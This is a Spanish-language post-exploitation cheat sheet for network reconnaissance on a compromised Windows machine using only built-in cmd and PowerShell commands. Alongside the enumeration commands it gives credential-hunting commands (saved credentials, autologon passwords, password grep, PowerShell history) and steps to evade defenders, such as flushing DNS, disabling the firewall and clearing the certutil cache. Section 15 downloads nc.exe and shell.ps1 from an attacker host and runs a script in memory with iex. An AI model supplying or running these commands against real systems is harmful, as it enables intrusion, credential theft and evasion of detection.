# Nombre: cheatsheet-recon-builtin-windows
# Descripción: Recon de red en un Windows recién comprometido usando SOLO comandos nativos (cmd + PowerShell, sin netcat ni nmap): máxima info con lo que ya viene instalado.
# Tags: windows, recon, post-exploitation, builtin, network, enumeration, powershell, cmd
# Uso: copia/pega cada comando en cmd o PowerShell; prioriza lo marcado con (*)

# Recon de red — Windows (solo comandos nativos)

> Todo lo de abajo existe en un Windows sin instalar nada. Alterna cmd y PowerShell según lo que tengas; los cmdlets `Get-Net*` son la versión moderna de `ipconfig`/`netstat`.

## 1. Identidad del host y del usuario (*)
- `hostname` → nombre del equipo
- `whoami` · `whoami /all` → usuario + grupos + privilegios (¿tokens de red/impersonación?)
- `echo %USERNAME% %USERDOMAIN% %LOGONSERVER%` → usuario, dominio y DC al que autenticó (PS: `$env:USERDOMAIN`)
- `systeminfo` · `systeminfo | findstr /i "Host Name OS Name Domain"` → SO, arquitectura, dominio
- `set` → variables de entorno (USERDOMAIN, USERDNSDOMAIN, LOGONSERVER, PROXY)
- `nltest /dsgetdc:dominio.com` → información del DC y roles (FSMO)
- `klist` → tickets Kerberos activos (hacia qué SPNs/DC) · `klist tgt`
- PS: `[System.Net.Dns]::GetHostName()` · `[System.Net.Dns]::GetHostAddresses("")`

## 2. Configuración de red (*)
- `ipconfig /all` → IPs, máscaras, gateway, DNS, DHCP, MAC
- `ipconfig /all | findstr /i "IPv4 Default Gateway DNS"` → resumen rápido
- `netsh interface ip show config` · `netsh interface ip show address` → detalle por interfaz
- `getmac` · `getmac /v /fo list` → MACs (duplicados = máquinas virtuales)
- `wmic nic get Name,MACAddress,NetEnabled,Speed` (legado) · PS: `Get-NetAdapter | Select Name,MacAddress,Status,LinkSpeed`
- PS: `Get-NetIPConfiguration` · `Get-NetIPAddress`
- `net config workstation` → equipo, dominio y usuario de la sesión
- `net config server` → nombre del servidor y comentario (revela función del equipo)

## 3. DNS (*)
- `ipconfig /displaydns` → caché DNS local (dominios que ha visitado = intel)
- `ipconfig /flushdns` → limpiar (evita que el defensor vea qué resolviste)
- `nslookup dominio.com` · `nslookup dominio.com 8.8.8.8` · `nslookup -type=ANY dominio.com`
- `nslookup -qt=SRV _ldap._tcp.dc._msdcs.dominio.com` → DCs del dominio (con DNS interno)
- `nslookup -qt=SRV _kerberos._tcp.dominio.com`
- PS: `Resolve-DnsName -Name dc01.dominio.com -Type A -Server <dns>` · `Get-DnsClientServerAddress` · `Get-DnsClientCache`
- `type C:\Windows\System32\drivers\etc\hosts` → entradas manuales (nombres internos)
- `netstat -n | findstr :53` → con qué DNS habla esta máquina

## 4. Tabla ARP (*)
- `arp -a` → hosts de la LAN vistos por esta máquina (mapa de red)
- `arp -a | findstr dynamic` → solo los vistos en tráfico reciente
- PS: `Get-NetNeighbor | Where-Object State -eq Reachable`

## 5. Rutas / gateway (*)
- `route print` · `route print -4` → todas las rutas (subredes internas = posibles pivots)
- `route print 0.0.*` → rutas por defecto
- `route print | findstr /i "0.0.0.0 10. 172. 192."` → filtro de redes privadas
- PS: `Get-NetRoute` · `Get-NetRoute -DestinationPrefix 10.10.11.0/24`
- `tracert 10.10.11.5` · `tracert -d` (más rápido, sin resolver)
- `pathping 10.10.11.5` → pérdida de paquetes por salto (más lento)

## 6. Puertos, sockets y conexiones (*)
- `netstat -ano` → todas las conexiones + PID
- `netstat -anob` → con el ejecutable (requiere admin) — el oro para ver quién escucha
- `netstat -ano | findstr LISTENING` → puertos abiertos
- `netstat -ano | findstr ESTABLISHED` → conexiones activas (¿hacia qué C2/red?)
- `netstat -ano | findstr :445` → filtro por puerto
- `netstat -e` → estadísticas de la interfaz (bytes/errores)
- `netstat -s` → estadísticas por protocolo (TCP/UDP/ICMP)
- `netstat -r` → tabla de rutas
- PID → proceso: `tasklist | findstr <PID>` · `tasklist /svc /fi "PID eq <PID>"` (¿qué servicio?)
- PS: `Get-NetTCPConnection` · `Get-NetTCPConnection -State Listen | Sort LocalPort -Unique`
- PS: `Get-Process -Id (Get-NetTCPConnection -LocalPort 8080).OwningProcess` → puerto→proceso
- PS: `Get-NetUDPEndpoint`

## 7. SMB / NetBIOS / sesiones (*)
- `net view` → equipos visibles en la red/dominio
- `net view \\10.10.10.5` · `net view \\10.10.10.5 /all` → recursos compartidos (incluye $)
- `net use` → sesiones SMB activas (hacia qué servidores) · `net use * /delete /y` (cerrarlas)
- `net share` → compartidos locales · `net file` → archivos abiertos por otros vía SMB
- `net session` → quién tiene sesión SMB abierta contra esta máquina (admin)
- `nbtstat -n` → nombre NetBIOS local · `nbtstat -s` → sesiones NetBIOS
- `nbtstat -A 10.10.10.5` → tabla NetBIOS remota (marca `<20>` = comparte archivos)
- `nbtstat -c` → caché NetBIOS (hosts recientes)
- PS: `Get-SmbShare` · `Get-SmbShare -Special` · `Get-SmbSession` · `Get-SmbConnection` · `Get-SmbOpenFile`
- `netstat -ano | findstr ":139 :445"` → conexiones SMB activas

## 8. Usuarios, grupos y dominio (*)
- `net user` · `net user <usuario>` → usuarios locales (si hay dominio: `net user /domain`)
- `net localgroup` · `net localgroup Administrators` · `net localgroup "Remote Desktop Users"`
- `net group /domain` · `net group "Domain Admins" /domain` · `net group "Domain Computers" /domain`
- `net accounts` · `net accounts /domain` → políticas de contraseña (para fuerza bruta posterior)
- `net time /domain` → hora del DC (también revela el DC)
- `wmic useraccount get Name,FullName,LocalAccount,Domain,SID` (legado)
- PS: `Get-LocalUser` · `Get-LocalGroupMember -Group "Administrators"` · `Get-CimInstance Win32_ComputerSystem | Select Domain,PartOfDomain`
- PS: `Get-CimInstance Win32_UserAccount | Select Name,Domain,LocalAccount,SID`
- `whoami /upn` · `whoami /fqdn` → identidad completa del usuario actual

## 9. Servicios y procesos de red (*)
- `tasklist /svc` → procesos con sus servicios (ver qué servicios de red corren)
- `tasklist /m` → DLLs por proceso (¿antivirus/EDR? ¿agentes de red?)
- `net start` → servicios iniciados
- `sc query` · `sc query state= all | findstr SERVICE_NAME` · `sc qc <servicio>` → detalles
- `wmic service get Name,State,PathName | findstr /i "ssh vpn http net"` (legado)
- PS: `Get-Service` · `Get-Process | Sort WS -Descending | Select -First 20`
- `netstat -anob | findstr ":80 :443 :3389 :1433 :3306 :8080"` → servicios de red escuchando
- `schtasks /query /fo LIST /v` → tareas programadas (¿jobs de red/backups con credenciales?)
- `wmic process list full` (legado) · PS: `Get-CimInstance Win32_Process | Select ProcessId,Name,CommandLine`

## 10. Firewall de Windows (*)
- `netsh advfirewall show currentprofile` → estado (ON/OFF)
- `netsh advfirewall firewall show rule name=all` → todas las reglas
- `netsh advfirewall firewall show rule name=all | findstr /i "Enabled Action Dir Protocol LocalPort RemotePort"` → resumen de reglas (qué puertos acepta)
- `netsh advfirewall show allprofiles` → los tres perfiles (domain/private/public)
- `netsh advfirewall set allprofiles state off` → desactivar (requiere admin, OJO con dejar rastro)
- `netsh advfirewall firewall add rule name="x" dir=in action=allow protocol=TCP localport=4444` → abrir puerto para listener
- `netsh advfirewall firewall delete rule name="x"`
- PS: `Get-NetFirewallRule | Where-Object Enabled | Select DisplayName,Direction,Action`

## 11. Proxy / configuración de red de usuario
- `reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"` → ProxyEnable/ProxyServer/ProxyOverride
- `reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" | findstr /i proxy`
- `netsh winhttp show proxy` → proxy WinHTTP (apps del sistema)
- `reg query "HKLM\SYSTEM\CurrentControlSet\Services\WinHttpAutoProxySvc"` (información del servicio)
- PS: `Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' | Select ProxyEnable,ProxyServer`

## 12. RDP y sesiones interactivas
- `qwinsta` · `query user` → sesiones RDP/consola activas (¿otro usuario conectado al que robar la sesión?)
- `query session` · `query termserver`
- `netstat -ano | findstr :3389` → conexiones RDP activas
- `reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections` → ¿RDP habilitado? (0 = sí)
- `reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations" /v InitialProgram`
- `net localgroup "Remote Desktop Users"` → quién puede conectar por RDP

## 13. Credenciales de red / cachés (*)
- `cmdkey /list` → credenciales guardadas (máquinas a las que puede autenticar sin contraseña)
- `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword` · `... /v DefaultUserName`
- `wmic netlogin get Name,FullName,LastLogon,ScriptPath` (legado)
- PS: `Get-StoredCredential -Target *` (si el módulo existe)
- `findstr /si /m "password.*=" C:\*.txt C:\*.xml C:\*.ini C:\*.config C:\*.bat 2>nul` → archivos con credenciales
- `ipconfig /displaydns` otra vez: los dominios resueltos apuntan a recursos (portal, VPN, correo...)
- `dir /s /b *.rdp` en `%USERPROFILE%\Documents` → conexiones RDP guardadas con IPs/usuarios
- `type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` → historial de PS (comandos de red ejecutados)

## 14. Captura de tráfico nativa
- `netsh trace start capture=yes filepath=C:\Windows\Temp\trace.etl` · `netsh trace stop` → captura sin instalar nada (se analiza luego con Wireshark/netmon)
- `pktmon start --capture` · `pktmon stop` (Win10 2004+) · `pktmon list` → capturador moderno
- `pktmon comp list` → qué componentes registran (filtro de intereses)

## 15. Transferencia de archivos / descargas nativas (*)
- `certutil -urlcache -split -f http://10.10.14.5/nc.exe C:\Windows\Temp\nc.exe` → descargar
- `certutil -urlcache -delete http://10.10.14.5/nc.exe` → limpiar rastro de cache
- `certutil -encode f.bin f.b64` · `certutil -decode f.b64 f.bin` → base64 local
- `bitsadmin /transfer dl /download /priority normal http://10.10.14.5/file C:\Temp\file` (clásico)
- `curl -o file.exe http://10.10.14.5/file.exe` (Win10 1803+ trae curl)
- PS: `iwr -Uri http://10.10.14.5/file.ps1 -OutFile file.ps1` (Invoke-WebRequest)
- PS: `(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/nc.exe','C:\Temp\nc.exe')`
- PS: `Start-BitsTransfer -Source http://10.10.14.5/file -Destination C:\Temp\file`
- PS: `iex (iwr http://10.10.14.5/shell.ps1)` → ejecutar desde memoria
- Subir datos: `type file.txt | certutil -encode - -enc` → base64 por la salida estándar y pegarlo

## 16. PowerShell: los one-liners de red que más rinden (*)
- `Test-NetConnection 10.10.10.5 -Port 445` → comprobar puerto (también `-InformationLevel Detailed`)
- `Test-NetConnection 10.10.10.5` → ping+traceroute+puerto
- `Get-NetTCPConnection -RemotePort 445 | Select RemoteAddress,RemotePort,State` → tráfico SMB
- `Get-NetTCPConnection -RemoteAddress 10.10.10.5` → todo el tráfico con un host
- `Resolve-DnsName -Name $env:USERDNSDOMAIN -Type SRV -Server <dns>` → servicios del dominio (LDAP, KDC, DC...)
- `Get-CimInstance Win32_ComputerSystem | Select Domain,Manufacturer,Model,TotalPhysicalMemory`
- `Get-CimInstance Win32_OperatingSystem | Select Caption,Version,OSArchitecture,LastBootUpTime`

## 17. Comprobación de salida / utilidades rápidas
- `ping 8.8.8.8` → ¿hay salida a internet? · `ping -a 10.10.10.5` → resolución inversa
- `netstat -ano | findstr ":53"` → con qué DNS habla · `netstat -ano | findstr "ESTABLISHED"` → hacia dónde habla
- `hostname` + `nslookup %COMPUTERNAME%` → FQDN completo
- `netsh interface portproxy show all` → ¿redirecciones de puerto configuradas? (pivot/MITM local)
- `wmic computersystem get domain,name` (legado) → dominio actual
- `systeminfo | findstr /i "Network"` · `netsh interface ip show ipstats` (stats por interfaz)

## Notas
- Si solo tienes cmd, todos los `Get-Net*` / `Get-CimInstance` se pueden lanzar con `powershell -c "..."`.
- No instales nada en el host: todo lo anterior es 100% nativo y deja huella mínima.
- Prioriza en los primeros 60 segundos: `whoami /all`, `netstat -anob`, `arp -a`, `route print`, `net user/group`, `net view`, `ipconfig /all`, `netsh advfirewall` y `cmdkey /list`. Eso define el terreno.